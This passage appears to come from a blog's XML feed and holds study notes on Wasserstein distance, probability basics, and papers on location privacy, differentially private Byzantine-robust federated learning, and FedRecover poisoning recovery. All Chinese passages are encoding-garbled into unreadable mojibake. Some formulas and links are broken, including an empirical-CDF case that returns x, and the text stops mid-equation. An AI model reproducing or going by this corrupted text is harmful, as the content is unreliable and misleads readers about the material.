Detection,å°†æ­£å¸¸åˆ†å¸ƒä¸æ½œåœ¨çš„å¼‚å¸¸åˆ†å¸ƒåšå¯¹æ¯”ï¼Œé€šè¿‡æ•æ‰è´¨é‡å’Œä½ç½®çš„å·®å¼‚ï¼Œæ¥è¯†åˆ«å¼‚å¸¸å€¼</li><li>æ•°æ®å¢å¼ºï¼Œåœ¨å¢å¼ºè®­ç»ƒæ•°æ®æ—¶ï¼Œä»å°½å¯èƒ½æ¥è¿‘åŸå§‹æ•°æ®åˆ†å¸ƒçš„åˆ†å¸ƒä¸­è¿›è¡Œé‡‡æ ·æ¥ç”ŸæˆçœŸå®çš„åˆæˆå€¼ã€‚</li></ol><h2 id="references-and-recommends">References and Recommends</h2><ol type="1"><li><ahref="https://jeremykun.com/2018/03/05/earthmover-distance/">EarthmoverDistance â€“ Math âˆ© Programming</a></li><li><a href="https://zhuanlan.zhihu.com/p/353418080">Wasserstein è·ç¦» -çŸ¥ä¹</a></li><li><ahref="https://rmoklesur.medium.com/understanding-wasserstein-distance-a-powerful-metric-in-machine-learning-100a1ff46b66">UnderstandingWasserstein Distance: A Powerful Metric in Machine Learning | byMoklesur Rahman | Jun, 2023 | Medium</a></li><li><ahref="https://stats.stackexchange.com/questions/605795/normalized-wasserstein-distance">python- Normalized Wasserstein distance - Cross Validated</a></li><li><ahref="https://github.com/scipy/scipy/issues/9152">wasserstein_distanceworks on distributions, not frequency vectors? Â· Issue #9152 Â·scipy/scipy</a></li><li><ahref="https://github.com/j2kun/earthmover/tree/main">j2kun/earthmover:Implementation of the Earthmover distance metric in python.</a></li><li><ahref="https://stats.stackexchange.com/questions/519286/intuition-on-wasserstein-distance">python- Intuition on Wasserstein Distance - Cross Validated</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> ml </category>
          
      </categories>
      
      
        <tags>
            
            <tag> distance </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Probabilities background for Wasserstein Distance</title>
      <link href="/blog/2023/09/17/math/probabilities/wasserstein_bg/"/>
      <url>/blog/2023/09/17/math/probabilities/wasserstein_bg/</url>
      
        <content type="html"><![CDATA[<h2 id="hypothesis-testing-in-probabilities">Hypothesis Testing inProbabilities</h2><p>A statistical hypothesis test is a method of statistical inferenceused to decide whether the data at hand sufficiently support aparticular hypothesis. It including both parametric and non-parametrictests.</p><ol type="1"><li><p>Parametric Tesing</p><p>Parametric tests are those tests for which we have <strong>priorknowledge of the population distribution (i.e, normal)</strong>, or ifnot then we can easily <strong>approximate it to a normaldistribution</strong> which is possible with the help of the CentralLimit Theorem.</p><p>å‚æ•°æ£€éªŒï¼ˆparametertestï¼‰å…¨ç§°å‚æ•°å‡è®¾æ£€éªŒï¼Œæ˜¯æŒ‡å½“æ€»ä½“åˆ†å¸ƒå·²çŸ¥æˆ–å¯è¿‘ä¼¼ï¼ˆå¦‚æ€»ä½“ä¸ºæ­£æ€åˆ†å¸ƒï¼‰æ—¶ï¼Œæ ¹æ®æ ·æœ¬æ•°æ®å¯¹æ€»ä½“åˆ†å¸ƒçš„ç»Ÿè®¡å‚æ•°ï¼ˆä¾‹å¦‚å‡å€¼ã€æ–¹å·®ç­‰ï¼‰è¿›è¡Œçš„ç»Ÿè®¡æ£€éªŒã€‚</p></li><li><p>Nonparametric Testing</p><p>Nonparametric tests can and should be broadly defined to include allmethodology that does not use a model based on a single parametricfamily.</p><p>éå‚æ•°æ£€éªŒ(Nonparametrictests)ä¸å‚æ•°æ£€éªŒå…±åŒæ„æˆç»Ÿè®¡æ¨æ–­çš„åŸºæœ¬å†…å®¹ã€‚åœ¨æ•°æ®åˆ†æè¿‡ç¨‹ä¸­ï¼Œç”±äºç§ç§åŸå› ï¼Œäººä»¬å¾€å¾€æ— æ³•å¯¹æ€»ä½“åˆ†å¸ƒå½¢æ€ä½œç®€å•å‡å®šï¼Œæ­¤æ—¶å‚æ•°æ£€éªŒä¸å†é€‚ç”¨ã€‚éå‚æ•°æ£€éªŒæ­£æ˜¯ä¸€ç±»åŸºäºè¿™ç§è€ƒè™‘ï¼Œåœ¨æ€»ä½“æ–¹å·®æœªçŸ¥æˆ–çŸ¥é“ç”šå°‘çš„æƒ…å†µä¸‹ï¼Œåˆ©ç”¨æ ·æœ¬æ•°æ®å¯¹æ€»ä½“åˆ†å¸ƒå½¢æ€ç­‰è¿›è¡Œæ¨æ–­çš„æ–¹æ³•ã€‚ç”±äºéå‚æ•°æ£€éªŒæ–¹æ³•åœ¨æ¨æ–­è¿‡ç¨‹ä¸­ä¸æ¶‰åŠæœ‰å…³æ€»ä½“åˆ†å¸ƒçš„å‚æ•°ï¼Œå› è€Œå¾—åä¸ºâ€œéå‚æ•°â€æ£€éªŒã€‚</p><p>å¸¸è§çš„éå‚æ•°æ£€éªŒåŒ…æ‹¬ï¼šå¡æ–¹æ£€éªŒ Chi-Squared Test, Kolmogorovâ€“Smirnovæ£€éªŒ, Wasserstein distance</p></li></ol><h2 id="terms">Terms</h2><p>To determine the distribution of a discrete random variable we caneither provide its Probability mass function (PMF) or cumulativedistribution function (CDF).</p><ol type="1"><li><p><strong>Probability mass function, PMF</strong></p><p>A probability mass function (pmf) is a function over the sample spaceof a <strong>discrete random variable</strong> X which gives theprobability that X is equal to a certain value. The PMF is one way todescribe the distribution of a discrete random variable (PMF cannot bedefined for continuous random variables).</p></li><li><p><strong>cumulative distribution function, CDF</strong></p><p>The cumulative distribution function (CDF) of a random variable isanother method to describe the distribution of random variables. Theadvantage of the CDF is that it can be defined for any kind of randomvariable (discrete, continuous, and mixed).</p><p>The cumulative distribution function (CDF) of random variable X isthe probability that X will take a value less than or equal to <spanclass="math inline">\(x\)</span>, <span class="math inline">\(F_X(x)=P(X\le x), \text{for all x} \in \mathcal{R}\)</span>.</p></li><li><p><strong>Probability density function</strong></p><p>For continuous random variables, the CDF is well-defined so we canprovide the CDF. However, the PMF does not work for continuous randomvariables, because for a continuous random variable <spanclass="math inline">\(P(X = x) = 0, \text{for all x} \in\mathcal{R}\)</span>. Instead, we can usually define the probabilitydensity function (PDF). The PDF is the density of probability ratherthan the probability mass.</p></li><li><p><strong>Quantile function (inverse CDF)</strong></p><p>Since the cdf <span class="math inline">\(F\)</span> is amonotonically increasing function, it has an inverse; let us denote thisby <span class="math inline">\(F^{âˆ’1}\)</span>. If ğ¹ is the cdf of ğ‘‹,then <span class="math inline">\(F^{âˆ’1}(\alpha)\)</span> is the value of<span class="math inline">\(x_a\)</span> such that <spanclass="math inline">\(P(X \le X_a) = \alpha\)</span>; this is called the<span class="math inline">\(\alpha\)</span> quantile of <spanclass="math inline">\(F\)</span></p><p>The cumulative distribution function takes as input ğ‘¥ and returnsvalues from the [0,1] interval (probabilities)â€”let's denote them as ğ‘.The inverse of the cumulative distribution function (or quantilefunction) tells you what <span class="math inline">\(x\)</span> wouldmake <span class="math inline">\(F(x)\)</span> return some value ğ‘,<span class="math inline">\(ğ¹^{âˆ’1}(ğ‘) = x\)</span></p></li></ol><h2 id="joint-probability-distribution">Joint probabilitydistribution</h2><p>With the Joint probability distribution, we can conclude the marginaldistributions. However, according two marginal distributions <spanclass="math inline">\(P\)</span> and <spanclass="math inline">\(Q\)</span>, the joint distribution is not unique,whose space can be denoted as <span class="math inline">\(\prod(P_r,P_g)\)</span>.</p><p>Joint cumulative distribution function is for discrete randomvariable.</p><h2 id="empirical-cdf">Empirical CDF</h2><p>Empirical distribution function (commonly also called an empiricalcumulative distribution function, eCDF) is the distribution functionassociated with the empirical measure of a sample. It is <strong>anestimator of the Cumulative Distribution Function</strong>. Thecumulative distribution function is a step function that jumps up by<span class="math inline">\(\frac{1}{n}\)</span> at each of the n datapoints.</p><p>Let <span class="math inline">\(X\)</span> be a random variable withCDF <span class="math inline">\(F(x) = P(X \le x)\)</span>, and let<span class="math inline">\(x_1, x_2, \cdots, x_n\)</span> be n i.i.drandom varibales sampled from <span class="math inline">\(X\)</span>(also called observation values). First, we can sort the observationvalues in ascending order as <span class="math inline">\(x_1 \le x_2\le, \cdots, x_n\)</span>, where the frequency of <spanclass="math inline">\(x_i\)</span> is <spanclass="math inline">\(n_i\)</span> (<span class="math inline">\(n_1 +n_2 ... + n_3 = n\)</span>). Then, the empirical CDF can be definedas:</p><p><span class="math display">\[F_n(x) = \begin{cases}0, \quad &amp;(x \lt x_1);\\\frac{n_1+n_2+\cdots+n_k}{n};\quad &amp;(x_k \le x \lt x_{k+1}); \quad(k=1,2,\cdots, r-1)\\x,\quad &amp;(x_k \ge x_{r})\end{cases}\]</span></p><p>or just</p><p><span class="math display">\[\begin{equation}F_n(x_t) = \frac{\text{number of elements in the samples} \le x_t}{n} =\frac{1}{n}\sum_{i=1}^n I_{x_i \le x_t},\end{equation}\]</span></p><p>where <span class="math inline">\(I(\cdot)\)</span> is the indicatorfunction. A illustration of empirical CDF of an example is shownbelow:</p><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/20230918105041.png"alt="20230918105041" /><figcaption aria-hidden="true">20230918105041</figcaption></figure><h2 id="references-and-recommends">References and Recommends</h2><ol type="1"><li><ahref="https://www.mayo.edu/research/documents/parametric-and-nonparametric-demystifying-the-terms/doc-20408960">Parametricand Nonparametric: Demystifying the Terms</a></li><li>lecture1.pdf](https://www.win.tue.nl/~rmcastro/AppStat2013/files/lecture1.pdf)</li><li>Introduction; The empirical distributionfunction](https://myweb.uiowa.edu/pbreheny/uk/teaching/621/notes/8-23.pdf)</li><li><ahref="https://en.wikipedia.org/wiki/Statistical_hypothesis_testing">Statisticalhypothesis testing - Wikipedia</a></li><li><ahref="https://baike.baidu.com/item/%E9%9D%9E%E5%8F%82%E6%95%B0%E6%A3%80%E9%AA%8C/6910745">éå‚æ•°æ£€éªŒ_ç™¾åº¦ç™¾ç§‘</a></li><li><ahref="https://en.wikipedia.org/wiki/Empirical_distribution_function">Empiricaldistribution function - Wikipedia</a></li><li><ahref="https://www.baike.com/wikiid/4071368234826461436?view_id=32wx4ozhw18000">æ ·æœ¬åˆ†å¸ƒå‡½æ•°- å¿«æ‡‚ç™¾ç§‘</a></li><li><ahref="https://towardsdatascience.com/understanding-empirical-distributions-ed131de5f3df">TODO:Empirical Distribution: Everything You Need To Know | by Shubham Panchal| Towards Data Science</a></li><li><ahref="https://stats.stackexchange.com/questions/212813/help-me-understand-the-quantile-inverse-cdf-function">distributions- Help me understand the quantile (inverse CDF) function - CrossValidated</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> probabilities </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>L-SRR Local Differential Privacy for Location-Based Services with Staircase Randomized Response</title>
      <link href="/blog/2023/08/11/academic/papers/ldp_location/"/>
      <url>/blog/2023/08/11/academic/papers/ldp_location/</url>
      
        <content type="html"><![CDATA[<p>PDF: <a href="https://arxiv.org/abs/2209.15091">[2209.15091] L-SRR:Local Differential Privacy for Location-Based Services with StaircaseRandomized Response</a>, ä»£ç ï¼š<ahref="https://github.com/hwangcsiit/Location-Local-Differential-Privacy">hwangcsiit/Location-Local-Differential-Privacy</a></p><h2 id="backgroud-and-motivation">Backgroud and Motivation</h2><p>åŸºäºä½ç½®çš„æœåŠ¡ï¼ˆLBSï¼‰å¹¿æ³›åº”ç”¨ï¼Œä½† local differential privacyï¼Œä½œä¸ºä¸€ç§å¼ºå¤§çš„éšç§æ¨¡å‹ï¼Œç”±äºç°å­˜çš„ LDP æœºåˆ¶æ•ˆç”¨ä¸é«˜ï¼Œæ— æ³•åº”ç”¨åˆ° LBSä¸­ã€‚</p><h2 id="contribution">Contribution</h2><ol type="1"><li><p>ç¬¬ä¸€ä¸ªæå‡º LDP æ¡†æ¶ L-SRR for å„æ ·çš„ LBSåº”ç”¨ï¼Œå¯ä»¥é«˜æ•ˆåœ°éšç§åœ°æ”¶é›†å’Œåˆ†æç”¨æˆ·ä½ç½®ã€‚</p></li><li><p>è®¾è®¡äº†æ–°çš„éšæœºå“åº”æœºåˆ¶ï¼Œé˜¶æ¢¯éšæœºå“åº”ï¼ŒStaircase RandomizedResponse, å¹¶æ‰©å±•äº† empirical estimationï¼Œä»¥æé«˜ SRR åœ¨ä¸åŒ LBSåº”ç”¨ä¸­çš„æ•ˆç”¨ï¼ˆä¾‹å¦‚äº¤é€šå¯†åº¦ä¼°è®¡ï¼Œk-æœ€è¿‘é‚»ï¼‰ã€‚</p><p>Randomized Response (RR) based schemes, such as generalizedrandomized response (GRR) and unary encoding (UE). However, only twodifferent perturbation probabilities are defined in the existing LDPmechanisms (e.g., GRR, UE, and HR), not sufficiently fine-grained tooptimize the utility (since the perturbation probabilities simply treatall the other output locations in the domain equally). å› æ­¤æå‡ºStaircase Randomized Response (SRR)</p><p>Intuition: if the probabilities for locations that are closer to theinput location ğ‘¥ can be higher, it is more possible for users that thequery results of the LBS are the same. To this end, SRR will firstconsider the location distances to the input location ğ‘¥.</p><p>å…·ä½“å®ç°ï¼š</p><ol type="1"><li><p>Hierarchical Location Encoding. To encode the location data, weuse a hierarchical encoding scheme based on the Bing Map TilesSystem</p></li><li><p>Location Groups</p><p>With hierarchical encoding for the location domain D, the distancebetween any two locations <span class="math inline">\(x,x^{&#39;} \inD\)</span> can be directly measured by the longest common prefixes (LCP)of their encoded bit strings.</p><p>Define the LCP of the group (GLCP): the shortest LCP between theinput location ğ‘¥ and <span class="math inline">\(\forall y \inG_j(x)\)</span></p><p>Then, we can partition all the output locations into groups using theGLCP lengths</p></li><li><p>Location Partitioning</p><p>partition the locations into <span class="math inline">\(m\)</span>groups for each input <span class="math inline">\(x \in D\)</span>, andassign the same perturbation probability to all the locations in thesame group.</p><p><span class="math display">\[\begin{equation}\mathrm{SRR}: \forall x \in \mathcal{D}, q(y \midx)=\left\{\begin{array}{ccc}\alpha_1(x), &amp; \text { if } y \in G_1(x) \\\vdots &amp; \vdots \\\alpha_m(x), &amp; \text { if } y \in G_m(x)\end{array}\right.\end{equation}\]</span></p><p>since SRR discretizes the perturbation probabilities for all thegrouped possible output locations, the PDF of SRR has a similar shape tothe staircase mechanism in differential privacy, which also has astaircase PDF for different groups to satisfy ğœ–-DP. That's the reasonwhy the paper name our new randomization mechanism as the â€œStaircaseRandomized Responseâ€ (SRR) in local differential privacy.</p></li><li><p>offline computation</p><p>Offline Computation. Since the optimization and partitioning aresolely based on the domain D, they can be executed offline andperiodically updated with D by the server in L-SRR.</p></li></ol></li><li><p>é€šè¿‡åœ¨ LBS åº”ç”¨ä¸­ä¸å…¶ä»– LDP æœºåˆ¶å¯¹æ¯”ï¼Œè¯æ˜äº†åœ¨ LBSåœºæ™¯åº”ç”¨ä¸­ï¼ŒL-SRR çš„æ•ˆç”¨ä¼˜äºç°æœ‰çš„ LDP æœºåˆ¶ã€‚</p></li></ol><h2 id="å€Ÿé‰´ç‚¹ç¦»æ•£åŒ–-é€šè¿‡è¿‘ä¼¼åˆ†ç»„æ€æƒ³é™ä½è®¡ç®—å¤æ‚åº¦">å€Ÿé‰´ç‚¹ï¼šç¦»æ•£åŒ–,é€šè¿‡è¿‘ä¼¼åˆ†ç»„æ€æƒ³é™ä½è®¡ç®—å¤æ‚åº¦</h2>]]></content>
      
      
      <categories>
          
          <category> academic </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Practical Differentially Private and Byzantine-resilient Federated Learning</title>
      <link href="/blog/2023/08/10/academic/papers/ldp_byz_fl/"/>
      <url>/blog/2023/08/10/academic/papers/ldp_byz_fl/</url>
      
        <content type="html"><![CDATA[<p><a href="https://arxiv.org/abs/2304.09762">Practical DifferentiallyPrivate and Byzantine-resilient Federated Learning</a> ï¼Œæºä»£ç : <ahref="https://github.com/zihangxiang/Practical-Differentially-Private-and-Byzantine-resilient-Federated">zihangxiang/Practical-Differentially-Private-and-Byzantine-resilient-Federated</a></p><p>å‘è¡¨åœ¨äº† Proceedings of the ACM on Management of Data (PACMMOD) 2023,çœ‹çŸ¥ä¹ä¸Šè¯´æ˜¯ SIGMOD 23 çš„æ–‡ç« æ”¹ä¸ºåœ¨ PACMMOD æœŸåˆŠã€‚</p><h2 id="backgroud-and-motivation">Backgroud and Motivation</h2><p>å¦‚ä½•åœ¨å®ç° privacy çš„å‰æä¸‹å®ç° Byzantine robust FL,å…³äºä½¿ç”¨å·®åˆ†éšç§ä¿æŠ¤æ¨¡å‹å‚æ•°å’Œä½¿ç”¨ Byzantine-robustæ–¹å¼æ¥ç¼“è§£æ¯’åŒ–ç­‰æ”»å‡»çš„ç ”ç©¶éƒ½å·²ç»æœ‰äº†ï¼Œä½†æ˜¯å¦‚ä½•åŒæ—¶å®ç°è¿™ä¸¤ä¸ªç›®æ ‡è¿˜æ²¡æœ‰è¾ƒå¥½çš„ç»“åˆã€‚</p><h2 id="contributions">Contributions</h2><p>æœ¬æ–‡æå‡ºå°†</p><ol type="1"><li>DP-SGD</li><li>ç±»ä¼¼äº NDSS'21 FLTrustï¼ˆnormalize and use cosine similarityï¼‰ä½†æ˜¯è¡¡é‡æŒ‡æ ‡æ”¹ä¸ºå‘é‡å†…ç§¯çš„æ£€æµ‹æ”»å‡»</li></ol><p>ç›¸ç»“åˆï¼Œå®ç°äº† DP å’Œ Byzantine-robust çš„è”é‚¦å­¦ä¹ ã€‚</p><p>Byzantine_detect { DP{W_i} }(å…ˆåŠ  DPï¼Œç„¶åå†æ£€æµ‹æ¶æ„æ”»å‡»)</p><h3 id="ç¬¬ä¸€é˜¶æ®µæ£€æŸ¥">ç¬¬ä¸€é˜¶æ®µæ£€æŸ¥</h3><p>ç”±äºéšæœºå™ªå£°çš„å¼•å…¥ä¼šå½±å“ç°å­˜ byzantine attacksæ£€æµ‹çš„æ•ˆæœï¼Œç°å­˜æœ‰äº›å·¥ä½œé€šè¿‡å¢å¤§ batch size æ¥é™åˆ¶å™ªå£°çš„å½±å“ã€‚æœ¬æ–‡ä½¿ç”¨small batch size æ¥ä½œä¸ºç¬¬ä¸€é˜¶æ®µçš„èšåˆã€‚ç¬¬ä¸€é˜¶æ®µçš„ small training batchsize for each worker å’Œç¬¬ä¸€é˜¶æ®µæ£€æŸ¥ï¼Œå¯ä»¥é˜²æ­¢ä¸€äº›æ”»å‡»</p><ol type="1"><li><p>å…·ä½“æ–¹å¼</p><p>Different from existing works that adopt big batch size (<spanclass="math inline">\(10^2 âˆ’10^6\)</span>), we adopt small batch size<span class="math inline">\(ğ‘_ğ‘\)</span> (typically 8 or 16).</p></li><li><p>idea</p><p>small batch size å¯ä»¥ä½¿å¾—æ¯æ¬¡çš„ä¸Šä¼ ç»“æœä¸­ DP noiseå æ®ä¸»å¯¼ï¼Œæ ¹æ®åŠ çš„é«˜æ–¯å™ªå£°ï¼Œä»è€Œæ¨å¯¼å‡ºä¸Šä¼ ç»“æœçš„ç»Ÿè®¡ç‰¹æ€§æ¥æ£€æµ‹æ”»å‡»ã€‚æ­¤å¤–ï¼Œå°½ç®¡æ¯ä¸ªworkerçš„ä¸Šä¼ ç»“æœä¸­å™ªå£°å æ®ä¸»å¯¼ï¼Œä½†æ˜¯æ‰€æœ‰çš„ä¸Šä¼ ç»“æœå¹³å‡ä¹‹åï¼Œä¾¿ä¼šå‡å°å™ªå£°çš„æ–¹å·®ï¼Œå¹³å‡æ¢¯åº¦åˆ°éé›¶æœŸæœ›ï¼Œä¾¿å¯ä»¥å®ç°è¾ƒå¥½çš„æ•ˆç”¨ã€‚</p></li><li><p>ç»†èŠ‚</p><p>æ¯ä¸ªå®¢æˆ·ç«¯çš„ä¸Šä¼ ç»“æœä¸­ DP noiseå æ®ä¸»å¯¼ï¼Œå› æ­¤å¯ä»¥å°†ä¸Šä¼ ç»“æœçœ‹ä½œå™ªå£°é‡‡æ ·çš„é«˜æ–¯åˆ†å¸ƒ N(0, <spanclass="math inline">\(\sigma^2\)</span>),æ ¹æ®é«˜æ–¯åˆ†å¸ƒå’Œå¡æ–¹åˆ†å¸ƒçš„ç‰¹æ€§ï¼Œå¯ä»¥å¾—çŸ¥ <spanclass="math inline">\(\frac{||g||^2}{\sigma^2}\)</span> æœä»å¡æ–¹åˆ†å¸ƒchi-squared distributionã€‚æ ¹æ®ä¸­å¿ƒæé™å®šç†ï¼Œå¯ä»¥å°† <spanclass="math inline">\(âˆ¥ğ‘”âˆ¥^2\)</span> è¿‘ä¼¼ä¸º Gaussian distribution: <spanclass="math inline">\(N(ğœ^2ğ‘‘, 2ğœ^4ğ‘‘)\)</span>, ä»è€Œ <spanclass="math inline">\(||g||^2\)</span> è½åœ¨ 3ğœ èŒƒå›´ä¹‹å†…</p><p>é€šè¿‡ 1. æ£€æŸ¥<span class="math inline">\(||g||^2\)</span> æ˜¯å¦è½åœ¨ 3ğœèŒƒå›´ä¹‹å†…ä»¥åŠ 2. é€šè¿‡ Kolmogorovâ€“Smirnov test (KS test) æ£€æµ‹ g æ˜¯å¦æ˜¯Gaussian distribution æ¥æ£€æµ‹æ”»å‡»</p></li></ol><h3 id="ç¬¬äºŒé˜¶æ®µèšåˆ">ç¬¬äºŒé˜¶æ®µèšåˆ</h3><p>å‘ç° bounding gradient sensitivity by normalizing æ›´é€‚åˆ DPlearningã€‚é€šè¿‡å¯¹ normalize å’Œå‘é‡å†…ç§¯æ¥ä½œä¸ºç¬¬äºŒé˜¶æ®µçš„æ£€æŸ¥ã€‚</p><p>use normalizing instead of clipping to bound per-example gradientnorm å’Œç¬¬äºŒé˜¶æ®µæ£€æŸ¥å¯ä»¥é˜»æ­¢ç»•è¿‡ç¬¬ä¸€é˜¶æ®µçš„å…¶ä»–æ”»å‡»</p><ol type="1"><li><p>å…·ä½“æ–¹å¼</p><p>Replace the clipping operation in vanilla DP-SGD by normalization tonormalization, which is change the multiplication factor from Factor =min{1, <span class="math inline">\(\frac{ğ¶}{âˆ¥gâˆ¥_2}\)</span>} (ğ¶ iscalled the clipping threshold) to Factor = <spanclass="math inline">\(\frac{1}{âˆ¥gâˆ¥_2}\)</span>, which normalizes thegradients to be of unit ğ‘” length.</p></li><li><p>idea</p><p>é€šè¿‡ server ç»´æŠ¤çš„ trusted æ¢¯åº¦ä¸æ¯ä¸ªå®¢æˆ·ç«¯çš„æ¢¯åº¦è®¡ç®—å‘é‡å†…ç§¯ä½œä¸ºscore æ¥æ£€æµ‹æ¢¯åº¦æ›´æ–°çš„æ–¹å‘ï¼Œé€‰æ‹© top <spanclass="math inline">\(âŒˆğ›¾ğ‘›âŒ‰\)</span> scores (è¦æ±‚ server é¢„å…ˆç¡®å®š n ä¸ªworker ä¸­è‡³å°‘æœ‰ ğ›¾ æ¯”ä¾‹çš„è‰¯æ€§èŠ‚ç‚¹)çš„å¹³å‡æ•°ä½œä¸ºç­›é€‰é˜ˆå€¼ã€‚</p></li></ol><h2 id="å±€é™æ€§">å±€é™æ€§</h2><ol type="1"><li><p>è¦æ±‚ server é¢„å…ˆç¡®å®š n ä¸ª worker ä¸­è‡³å°‘æœ‰ ğ›¾ æ¯”ä¾‹çš„è‰¯æ€§èŠ‚ç‚¹</p><p>the server has a prior belief that at least âŒˆğ›¾ğ‘›âŒ‰ workers arehonest,</p></li><li><p>åªèƒ½åº”ç”¨äºé«˜æ–¯å™ªå£°</p></li><li><p>first aggregation çš„çº¦æŸçœ‹èµ·æ¥å¹¶ä¸ solidï¼Ÿ</p><ol type="1"><li>æœ¬æ–‡ä»¿ä½›æ˜¯å…ˆ DPï¼Œç„¶åä½¿ç”¨ FLTrust çš„ normalizationå’Œç›¸ä¼¼åº¦æ¢æˆå†…ç§¯ç›´æ¥ç»„åˆè€Œæˆã€‚ç¬¬ä¸€é˜¶æ®µçš„ç¡®å®å¢åŠ äº†çº¦æŸï¼Œä½†æ˜¯æˆ‘æ²¡æœ‰çœ‹åˆ°è¯¥çº¦æŸå’Œç¬¬äºŒé˜¶æ®µçº¦æŸçš„äº’è¡¥æ€§åœ¨å“ªé‡Œ</li></ol><p>è™½ç„¶ä½œè€…åœ¨æ–‡ç« ä¸­ 4.7 Discussionè®²åˆ°ç¬¬äºŒé˜¶æ®µå¯èƒ½ä¼šå› ä¸ºå™ªå£°çš„éšæœºæ€§æ•ˆæœä¸å¥½ï¼Œä½†æ˜¯ä½¿ç”¨ç¬¬ä¸€é˜¶æ®µä¼šå¥½çš„åŸå› ï¼Œå®ƒåªè§£é‡Šäº†å› ä¸ºnormäº†æ‰€ä»¥å¨èƒå°äº†ï¼Œå¹¶æ²¡æœ‰è¯´ç¬¬ä¸€é˜¶æ®µçš„ä¸¤ä¸ªçº¦æŸå…·ä½“çº¦æŸäº†å“ªäº›æ”»å‡»,è™½ç„¶ç¡®å®å¤šäº†ä¸€äº›æ­£ç¡®çº¦æŸã€‚</p><ol start="2" type="1"><li>ç¬¬äºŒé˜¶æ®µä½¿ç”¨çš„å®¢æˆ·ç«¯æ¢¯åº¦æ˜¯ç¬¬ä¸€é˜¶æ®µä¹‹åçš„ï¼Œä½†æ˜¯è¿˜æ˜¯åŠ äº†å™ªå£°ï¼Œbyzantineattack æ£€æµ‹ä¹Ÿä¼šä¸å‡†ç¡®å§ã€‚</li></ol></li></ol><h2 id="å‚è€ƒèµ„æ–™">å‚è€ƒèµ„æ–™</h2><ol type="1"><li><a href="https://www.zhihu.com/question/591218708?utm_id=0">å¦‚ä½•è¯„ä»·SIGMOD23 çš„æ–‡ç« æ”¹ä¸ºåœ¨ PACMMOD æœŸåˆŠä¸Šå‘è¡¨ï¼Ÿ - çŸ¥ä¹</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> academic </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>FedRecover è®ºæ–‡é˜…è¯»ç¬”è®°</title>
      <link href="/blog/2023/08/04/academic/papers/fedrecover/"/>
      <url>/blog/2023/08/04/academic/papers/fedrecover/</url>
      
        <content type="html"><![CDATA[<p>Cao, Xiaoyu, et al. "Fedrecover: Recovering from poisoning attacks infederated learning using historical information." 2023 IEEE Symposium onSecurity and Privacy (SP). IEEE, 2023. <ahref="%5BFedRecover:%20Recovering%20from%20Poisoning%20Attacks%20in%20Federated%20Learning%20using%20Historical%20Information%5D(https://arxiv.org/abs/2210.10936)">Paperlink</a></p><h2 id="backgroud-and-motivation">Backgroud and Motivation</h2><p>ç›®å‰å…³äº poisoning attack çš„é˜²å¾¡ä¸»è¦é›†ä¸­åœ¨ï¼š</p><ol type="1"><li>Preventionï¼šå¯¹äºå°è§„æ¨¡çš„æ¶æ„å®¢æˆ·ç«¯ï¼Œé€šè¿‡ robust è”é‚¦å­¦ä¹ æ–¹æ³•æ¥æ£€æµ‹,ç¼“è§£æˆ–æ’é™¤è¢«æ¯’åŒ–çš„æœ¬åœ°æ¨¡å‹æ¥é¿å…å…¨å±€æ¨¡å‹é­å—æ¯’åŒ–ã€‚</li><li>Detection: æ£€æµ‹å¤§è§„æ¨¡çš„æ¶æ„å®¢æˆ·ç«¯</li></ol><p>é—®é¢˜ï¼šåœ¨æ£€æµ‹åˆ°æ¶æ„å®¢æˆ·ç«¯ä¹‹åï¼Œå¦‚ä½•æ¢å¤è¢«æ¯’åŒ–æ”»å‡»çš„å…¨å±€æ¨¡å‹ï¼Ÿ</p><h2 id="contributions">Contributions</h2><p>FedRecover idea çš„å‡ºå‘ç‚¹åº”è¯¥æ˜¯ poisoning attacks å’Œ machineunlearning çš„ç»“åˆã€‚ä½†æˆ‘çœ‹åˆ°æœ¬è®ºæ–‡ä¹‹å‰æœ‰ä¸€äº›æ–‡ç« ï¼šé’ˆå¯¹ poisioning attackç­‰éœ€æ±‚ï¼Œæå‡º federeated machine unlearningï¼Œåº”è¯¥æ˜¯æ²¡æœ‰ç›´æ¥è€ƒè™‘ poisoningattacks ä¹‹å recovery è¿™ä¸ªåº”ç”¨åœºæ™¯ä»¥åŠå¯¹åº”çš„è§£å†³åŠæ³•ã€‚</p><p>naive method: train-from-scratchæ˜¯æ£€æµ‹åˆ°æ¶æ„å®¢æˆ·ç«¯ä¹‹åï¼Œå‰”é™¤æ¶æ„çš„ï¼Œç”¨å‰©ä¸‹çš„å®¢æˆ·ç«¯é‡æ–°è®­ç»ƒä¸€éï¼Œä½†æ˜¯é€šä¿¡å’Œè®¡ç®—å¼€é”€æ˜¾ç„¶å¾ˆå¤§ã€‚</p><p>æœ¬æ–‡æå‡ºçš„ FedRecoveræ–¹æ³•ä½¿ç”¨æ£€æµ‹åˆ°æ¶æ„æ”»å‡»è€…ä¹‹å‰çš„æœ¬åœ°æ¨¡å‹ä¸æ›´æ–°æ¥ä¼°è®¡ä»¥åæ¯è½®çš„æœ¬åœ°æ¨¡å‹æ›´æ–°ï¼Œä»è€Œæ¢å¤å…¨å±€æ¨¡å‹ã€‚</p><ol type="1"><li>the server stores the historical information, including the globalmodels and clientsâ€™ model updates in each round, when training thepoisoned global model before the malicious clients are detected.</li><li>During the recovery process, the server estimates a clientâ€™s modelupdate in each round using its stored historical information.</li><li>å½“ server è®¤ä¸º estimated global model updateä¸å¤Ÿç²¾ç¡®æ—¶ï¼Œå®ƒå¯ä»¥åœ¨è¿›è¡Œä¸€è½®å¸¸è§„çš„ FL è®­ç»ƒæ¥æå‡å‡†ç¡®åº¦ã€‚</li></ol><p>æ ¸å¿ƒå…¬å¼ï¼š</p><p>integral version of the Cauchy mean value theorem:</p><p><span class="math display">\[\begin{equation}f(x+y)-f(x)=\int_0^1 f^{\prime}(x+t y) y d t=\int_0^1 f^{\prime}(x+t y)d t \cdot y\end{equation}\]</span></p><p>from Theorem 4.2 on page 341 of S. Lang, Real and FunctionalAnalysis. Springer, 1993.</p><p>æœ¬æ–‡çš„æ ¸å¿ƒå…¬å¼ï¼š</p><p>$$ <span class="math display">\[\begin{equation}\begin{aligned}    